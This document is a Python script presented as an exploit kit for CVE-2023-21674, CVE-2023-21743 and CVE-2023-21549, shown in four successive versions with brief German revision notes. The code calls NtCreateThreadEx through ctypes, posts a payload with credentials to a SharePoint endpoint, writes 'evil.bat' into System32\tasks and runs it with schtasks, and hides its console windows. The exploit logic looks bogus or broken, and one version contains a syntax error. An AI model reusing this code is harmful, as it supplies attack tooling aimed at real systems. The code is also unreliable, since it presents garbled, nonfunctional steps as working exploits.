import ctypes
import ctypes.wintypes
import subprocess
import random
import os
import tempfile
import time
import requests
from requests.auth import HTTPBasicAuth
import argparse

def generate_random_filename(length=8):
    chars = "abcdef0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def exploit_cve_2023_21674(output_dir=None):
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        if not kernel32 or not ntdll:
            raise OSError("Failed to load necessary DLLs.")

        NtCreateThreadEx = ntdll.NtCreateThreadEx
        NtCreateThreadEx.argtypes = [ctypes.POINTER(ctypes.wintypes.HANDLE), ctypes.c_uint32, ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID)]
        NtCreateThreadEx.restype = ctypes.c_long

        thread_handle = ctypes.wintypes.HANDLE()
        result = NtCreateThreadEx(ctypes.byref(thread_handle), 0, None, None, None, None, None, None, None, None, None, None, None)

        if result == 0:
            print("CVE-2023-21674: Thread created successfully.")
            time.sleep(1)

            if output_dir is None:
                output_dir = tempfile.gettempdir()
            output_filename = generate_random_filename() + ".txt"
            output_path = os.path.join(output_dir, output_filename)

            for _ in range(3):
                subprocess.run(["cmd.exe", "/c", f"whoami > {output_path}"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if os.path.exists(output_path):
                    break
                time.sleep(0.5)

            if os.path.exists(output_path):
                with open(output_path, "r") as f:
                    output_content = f.read()
                    print(f"CVE-2023-21674: Output: {output_content}")
                os.remove(output_path)
            else:
                print("CVE-2023-21674: Failed to capture output after multiple attempts.")
        else:
            print("CVE-2023-21674: Thread creation failed.")

    except Exception as e:
        print(f"CVE-2023-21674: Error: {e}")

def exploit_cve_2023_21743(target_url, username, password, payload_data="exploit_payload"):
    try:
        vulnerable_endpoint = f"{target_url}/_layouts/15/start.aspx"
        payload = {
            "Content-Type": "application/x-www-form-urlencoded",
            "data": payload_data
        }
        response = requests.post(vulnerable_endpoint, auth=HTTPBasicAuth(username, password), data=payload)

        if response.status_code == 200:
            print("CVE-2023-21743: Exploit executed successfully!")
            print("CVE-2023-21743: Response:", response.text)
        else:
            print("CVE-2023-21743: Exploit failed!")
    except Exception as e:
        print(f"CVE-2023-21743: Error: {e}")

def exploit_cve_2023_21549():
    try:
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file_path = temp_file.name
        temp_file.write(b'whoami > C:\\Windows\\Temp\\cve_2023_21549_output.txt')
        temp_file.close()

        command = f'fsutil resource setautoreset true C:\\ && copy /y "{temp_file_path}" C:\\Windows\\System32\\tasks\\evil.bat && schtasks /run /tn evil'
        subprocess.run(command, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

        time.sleep(2)

        with open('C:\\Windows\\Temp\\cve_2023_21549_output.txt', 'r') as f:
            output = f.read()
            print("CVE-2023-21549 Output:", output)

        os.remove('C:\\Windows\\Temp\\cve_2023_21549_output.txt')
        os.remove('C:\\Windows\\System32\\tasks\\evil.bat')
        os.remove(temp_file_path)

    except subprocess.CalledProcessError as e:
        print(f"CVE-2023-21549: Fehler bei der Ausführung des Befehls: {e}")
    except FileNotFoundError:
        print("CVE-2023-21549: Ausgabe konnte nicht gefunden werden.")
    except Exception as e:
        print(f"CVE-2023-21549: Ein unerwarteter Fehler ist aufgetreten: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit CVE-2023-21674, CVE-2023-21743 and CVE-2023-21549")
    parser.add_argument("--target_url", help="Target URL for CVE-2023-21743")
    parser.add_argument("--username", help="Username for CVE-2023-21743")
    parser.add_argument("--password", help="Password for CVE-2023-21743")
    parser.add_argument("--payload", default="exploit_payload", help="Payload for CVE-2023-21743")
    parser.add_argument("--output_dir", help="Output directory for CVE-2023-21674")
    args = parser.parse_args()

    exploit_cve_2023_21674(args.output_dir)

    if args.target_url and args.username and args.password:
        exploit_cve_2023_21743(args.target_url, args.username, args.password, args.payload)
    else:
        print("CVE-2023-21743: Target URL, username, and password are required.")

    exploit_cve_2023_21549()




---------


mit prüfung ob alle vorausetzungen erfüllt sind 


import ctypes
import ctypes.wintypes
import subprocess
import random
import os
import tempfile
import time
import requests
from requests.auth import HTTPBasicAuth
import argparse
import sys
import shutil

def check_and_install_module(module_name):
    """Überprüft und installiert das benötigte Python-Modul."""
    try:
        __import__(module_name)
        print(f"[INFO] Modul '{module_name}' ist bereits installiert.")
        return True
    except ImportError:
        print(f"[INFO] Modul '{module_name}' ist nicht installiert. Starte Installation...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[INFO] Modul '{module_name}' erfolgreich installiert.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[FEHLER] Fehler bei der Installation von '{module_name}': {e}")
            return False

def remove_temp_files(temp_dir):
    """Entfernt rekursiv ein Verzeichnis und alle Inhalte."""
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
            print(f"[INFO] Temporäres Verzeichnis '{temp_dir}' und Inhalt entfernt.")
    except Exception as e:
        print(f"[FEHLER] Fehler beim Entfernen von '{temp_dir}': {e}")

def generate_random_filename(length=8):
    """Generiert einen zufälligen Dateinamen."""
    chars = "abcdef0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def exploit_cve_2023_21674(output_dir=None):
    """Führt den Exploit für CVE-2023-21674 aus."""
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        if not kernel32 or not ntdll:
            raise OSError("[FEHLER] DLLs konnten nicht geladen werden.")

        NtCreateThreadEx = ntdll.NtCreateThreadEx
        NtCreateThreadEx.argtypes = [ctypes.POINTER(ctypes.wintypes.HANDLE), ctypes.c_uint32, ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID)]
        NtCreateThreadEx.restype = ctypes.c_long

        thread_handle = ctypes.wintypes.HANDLE()
        result = NtCreateThreadEx(ctypes.byref(thread_handle), 0, None, None, None, None, None, None, None, None, None, None, None)

        if result == 0:
            print("[INFO] CVE-2023-21674: Thread erfolgreich erstellt.")
            time.sleep(1)

            if output_dir is None:
                output_dir = tempfile.mkdtemp()
            output_filename = generate_random_filename() + ".txt"
            output_path = os.path.join(output_dir, output_filename)

            for _ in range(3):
                subprocess.run(["cmd.exe", "/c", f"whoami > {output_path}"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if os.path.exists(output_path):
                    break
                time.sleep(0.5)

            if os.path.exists(output_path):
                with open(output_path, "r") as f:
                    output_content = f.read()
                    print(f"[INFO] CVE-2023-21674: Ausgabe: {output_content.strip()}")
                os.remove(output_path)
            else:
                print("[FEHLER] CVE-2023-21674: Ausgabe nach mehreren Versuchen nicht erfasst.")
        else:
            print("[FEHLER] CVE-2023-21674: Thread-Erstellung fehlgeschlagen.")

        if output_dir is not None:
             remove_temp_files(output_dir)

    except Exception as e:
        print(f"[FEHLER] CVE-2023-21674: Fehler: {e}")

def exploit_cve_2023_21743(target_url, username, password, payload_data="exploit_payload"):
    """Führt den Exploit für CVE-2023-21743 aus."""
    try:
        vulnerable_endpoint = f"{target_url}/_layouts/15/start.aspx"
        payload = {
            "Content-Type": "application/x-www-form-urlencoded",
            "data": payload_data
        }
        response = requests.post(vulnerable_endpoint, auth=HTTPBasicAuth(username, password), data=payload)

        if response.status_code == 200:
            print("[INFO] CVE-2023-21743: Exploit erfolgreich ausgeführt!")
            print(f"[INFO] CVE-2023-21743: Antwort: {response.text.strip()}")
        else:
            print("[FEHLER] CVE-2023-21743: Exploit fehlgeschlagen!")
    except Exception as e:
        print(f"[FEHLER] CVE-2023-21743: Fehler: {e}")

def exploit_cve_2023_21549():
    """Führt den Exploit für CVE-2023-21549 aus."""
    try:
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file_path = temp_file.name
        temp_file.write(b'whoami > C:\\Windows\\Temp\\cve_2023_21549_output.txt')
        temp_file.close()

        command = f'fsutil resource setautoreset true C:\\ && copy /y "{temp_file_path}" C:\\Windows\\System32\\tasks\\evil.bat && schtasks /run /tn evil'
        subprocess.run(command, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

        time.sleep(2)

        output_path = 'C:\\Windows\\Temp\\cve_2023_21549_output.txt'

        if os.path.exists(output_path):
          with open(output_path, 'r') as f:
              output = f.read()
              print(f"[INFO] CVE-2023-21549 Ausgabe: {output.strip()}")

          os.remove(output_path)
          os.remove('C:\\Windows\\System32\\tasks\\evil.bat')
          os.remove(temp_file_path)

        else:
            print("[FEHLER] CVE-2023-21549: Ausgabe konnte nicht gefunden werden.")

    except subprocess.CalledProcessError as e:
        print(f"[FEHLER] CVE-2023-21549: Fehler bei der Befehlsausführung: {e}")
    except Exception as e:
        print(f"[FEHLER] CVE-2023-21549: Unerwarteter Fehler: {e}")

if __name__ == "__main__":
    required_modules = ['requests', 'argparse']

    all_modules_installed = True
    for module in required_modules:
        if not check_and_install_module(module):
            all_modules_installed = False
            break

    if all_modules_installed:
        parser = argparse.ArgumentParser(description="Exploits CVE-2023-21674, CVE-2023-21743 and CVE-2023-21549")
        parser.add_argument("--target_url", help="Target URL für CVE-2023-21743")
        parser.add_argument("--username", help="Benutzername für CVE-2023-21743")
        parser.add_argument("--password", help="Passwort für CVE-2023-21743")
        parser.add_argument("--payload", default="exploit_payload", help="Payload für CVE-2023-21743")
        parser.add_argument("--output_dir", help="Ausgabe Verzeichnis für CVE-2023-21674")
        args = parser.parse_args()

        print("[+] Starte Exploit-Skript...")

        exploit_cve_2023_21674(args.output_dir)

        if args.target_url and args.username and args.password:
            exploit_cve_2023_21743(args.target_url, args.username, args.password, args.payload)
        else:
            print("[WARNUNG] CVE-2023-21743: Ziel-URL, Benutzername und Passwort sind erforderlich, um diesen Exploit auszuführen.")

        exploit_cve_2023_21549()

        print("[+] Exploit-Skript abgeschlossen.")
    else:
        print("[FEHLER] Nicht alle benötigten Module konnten installiert werden. Skriptabbruch.")






-----
Ohne  cve 2023 21743

-----
import ctypes
import ctypes.wintypes
import subprocess
import random
import os
import tempfile
import time
import requests
from requests.auth import HTTPBasicAuth
import argparse
import sys
import shutil

def check_and_install_module(module_name):
    """Überprüft und installiert das benötigte Python-Modul."""
    try:
        __import__(module_name)
        print(f"[INFO] Modul '{module_name}' ist bereits installiert.")
        return True
    except ImportError:
        print(f"[INFO] Modul '{module_name}' ist nicht installiert. Starte Installation...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[INFO] Modul '{module_name}' erfolgreich installiert.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[FEHLER] Fehler bei der Installation von '{module_name}': {e}")
            return False

def remove_temp_files(temp_dir):
    """Entfernt rekursiv ein Verzeichnis und alle Inhalte."""
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
            print(f"[INFO] Temporäres Verzeichnis '{temp_dir}' und Inhalt entfernt.")
    except Exception as e:
        print(f"[FEHLER] Fehler beim Entfernen von '{temp_dir}': {e}")

def generate_random_filename(length=8):
    """Generiert einen zufälligen Dateinamen."""
    chars = "abcdef0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def exploit_cve_2023_21674(output_dir=None):
    """Führt den Exploit für CVE-2023-21674 aus."""
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        if not kernel32 or not ntdll:
            raise OSError("[FEHLER] DLLs konnten nicht geladen werden.")

        NtCreateThreadEx = ntdll.NtCreateThreadEx
        NtCreateThreadEx.argtypes = [ctypes.POINTER(ctypes.wintypes.HANDLE), ctypes.c_uint32, ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID)]
        NtCreateThreadEx.restype = ctypes.c_long

        thread_handle = ctypes.wintypes.HANDLE()
        result = NtCreateThreadEx(ctypes.byref(thread_handle), 0, None, None, None, None, None, None, None, None, None, None, None)

        if result == 0:
            print("[INFO] CVE-2023-21674: Thread erfolgreich erstellt.")
            time.sleep(1)

            if output_dir is None:
                output_dir = tempfile.mkdtemp()
            output_filename = generate_random_filename() + ".txt"
          t output_path = os.path.join(output_dir, output_filename)

            for _ in range(3):
                subprocess.run(["cmd.exe", "/c", f"whoami > {output_path}"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if os.path.exists(output_path):
                    break
                time.sleep(0.5)

            if os.path.exists(output_path):
                with open(output_path, "r") as f:
                    output_content = f.read()
                    print(f"[INFO] CVE-2023-21674: Ausgabe: {output_content.strip()}")
                os.remove(output_path)
            else:
                print("[FEHLER] CVE-2023-21674: Ausgabe nach mehreren Versuchen nicht erfasst.")
        else:
            print("[FEHLER] CVE-2023-21674: Thread-Erstellung fehlgeschlagen.")

        if output_dir is not None:
             remove_temp_files(output_dir)

    except Exception as e:
        print(f"[FEHLER] CVE-2023-21674: Fehler: {e}")



def exploit_cve_2023_21549():
    """Führt den Exploit für CVE-2023-21549 aus."""
    try:
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file_path = temp_file.name
        temp_file.write(b'whoami > C:\\Windows\\Temp\\cve_2023_21549_output.txt')
        temp_file.close()

        command = f'fsutil resource setautoreset true C:\\ && copy /y "{temp_file_path}" C:\\Windows\\System32\\tasks\\evil.bat && schtasks /run /tn evil'
        subprocess.run(command, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

        time.sleep(2)

        output_path = 'C:\\Windows\\Temp\\cve_2023_21549_output.txt'

        if os.path.exists(output_path):
          with open(output_path, 'r') as f:
              output = f.read()
              print(f"[INFO] CVE-2023-21549 Ausgabe: {output.strip()}")

          os.remove(output_path)
          os.remove('C:\\Windows\\System32\\tasks\\evil.bat')
          os.remove(temp_file_path)

        else:
            print("[FEHLER] CVE-2023-21549: Ausgabe konnte nicht gefunden werden.")

    except subprocess.CalledProcessError as e:
        print(f"[FEHLER] CVE-2023-21549: Fehler bei der Befehlsausführung: {e}")
    except Exception as e:
        print(f"[FEHLER] CVE-2023-21549: Unerwarteter Fehler: {e}")

if __name__ == "__main__":
    required_modules = ['requests', 'argparse']

    all_modules_installed = True
    for module in required_modules:
        if not check_and_install_module(module):
            all_modules_installed = False
            break

    if all_modules_installed:
        parser = argparse.ArgumentParser(description="Exploits CVE-2023-21674 and CVE-2023-21549") # CVE-2023-21743 entfernt
        parser.add_argument("--output_dir", help="Ausgabe Verzeichnis für CVE-2023-21674")
        args = parser.parse_args()

        print("[+] Starte Exploit-Skript...")

        exploit_cve_2023_21674(args.output_dir)


        exploit_cve_2023_21549()

        print("[+] Exploit-Skript abgeschlossen.")
    else:
        print("[FEHLER] Nicht alle benötigten Module konnten installiert werden. Skriptabbruch.")



überarbeitet 


```python
import ctypes
import ctypes.wintypes
import subprocess
import random
import os
import tempfile
import time
import argparse
import sys
import shutil

def check_and_install_module(module_name):
    """Checks and installs the required Python module."""
    try:
        __import__(module_name)
        print(f"[INFO] Module '{module_name}' is already installed.")
        return True
    except ImportError:
        print(f"[INFO] Module '{module_name}' is not installed. Starting installation...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[INFO] Module '{module_name}' successfully installed.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Error installing '{module_name}': {e}")
            return False

def remove_temp_files(temp_dir):
    """Recursively removes a directory and all its contents."""
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
            print(f"[INFO] Temporary directory '{temp_dir}' and contents removed.")
    except Exception as e:
        print(f"[ERROR] Error removing '{temp_dir}': {e}")

def generate_random_filename(length=8):
    """Generates a random filename."""
    chars = "abcdef0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def exploit_cve_2023_21674(output_dir=None):
    """Exploits CVE-2023-21674."""
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        if not kernel32 or not ntdll:
            raise OSError("[ERROR] DLLs could not be loaded.")

        NtCreateThreadEx = ntdll.NtCreateThreadEx
        NtCreateThreadEx.argtypes = [ctypes.POINTER(ctypes.wintypes.HANDLE), ctypes.c_uint32, ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID), ctypes.POINTER(ctypes.wintypes.LPVOID)]
        NtCreateThreadEx.restype = ctypes.c_long

        thread_handle = ctypes.wintypes.HANDLE()
        result = NtCreateThreadEx(ctypes.byref(thread_handle), 0, None, None, None, None, None, None, None, None, None, None, None)

        if result == 0:
            print("[INFO] CVE-2023-21674: Thread successfully created.")
            time.sleep(1)

            if output_dir is None:
                output_dir = tempfile.mkdtemp()
            output_filename = generate_random_filename() + ".txt"
            output_path = os.path.join(output_dir, output_filename)

            for _ in range(3):
                subprocess.run(["cmd.exe", "/c", f"whoami > {output_path}"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if os.path.exists(output_path):
                    break
                time.sleep(0.5)

            if os.path.exists(output_path):
                with open(output_path, "r") as f:
                    output_content = f.read()
                    print(f"[INFO] CVE-2023-21674: Output: {output_content.strip()}")
                os.remove(output_path)
            else:
                print("[ERROR] CVE-2023-21674: Output not captured after multiple attempts.")
        else:
            print("[ERROR] CVE-2023-21674: Thread creation failed.")

        if output_dir is not None:
            remove_temp_files(output_dir)

    except Exception as e:
        print(f"[ERROR] CVE-2023-21674: Error: {e}")

def exploit_cve_2023_21549():
    """Exploits CVE-2023-21549."""
    try:
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file_path = temp_file.name
        temp_file.write(b'whoami > C:\\Windows\\Temp\\cve_2023_21549_output.txt')
        temp_file.close()

        command = f'fsutil resource setautoreset true C:\\ && copy /y "{temp_file_path}" C:\\Windows\\System32\\tasks\\evil.bat && schtasks /run /tn evil'
        subprocess.run(command, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

        time.sleep(2)

        output_path = 'C:\\Windows\\Temp\\cve_2023_21549_output.txt'

        if os.path.exists(output_path):
            with open(output_path, 'r') as f:
                output = f.read()
                print(f"[INFO] CVE-2023-21549 Output: {output.strip()}")

            os.remove(output_path)
            os.remove('C:\\Windows\\System32\\tasks\\evil.bat')
            os.remove(temp_file_path)

        else:
            print("[ERROR] CVE-2023-21549: Output not found.")

    except subprocess.CalledProcessError as e:
        print(f"[ERROR] CVE-2023-21549: Error executing command: {e}")
    except Exception as e:
        print(f"[ERROR] CVE-2023-21549: Unexpected error: {e}")

if __name__ == "__main__":
    required_modules = ['requests', 'argparse']

    all_modules_installed = True
    for module in required_modules:
        if not check_and_install_module(module):
            all_modules_installed = False
            break

    if all_modules_installed:
        parser = argparse.ArgumentParser(description="Exploits CVE-2023-21674 and CVE-2023-21549")
        parser.add_argument("--output_dir", help="Output directory for CVE-2023-21674")
        args = parser.parse_args()

        print("[+] Starting exploit script...")

        exploit_cve_2023_21674(args.output_dir)
        exploit_cve_2023_21549()

        print("[+] Exploit script completed.")
    else:
        print("[ERROR] Not all required modules could be installed. Script aborted.")
```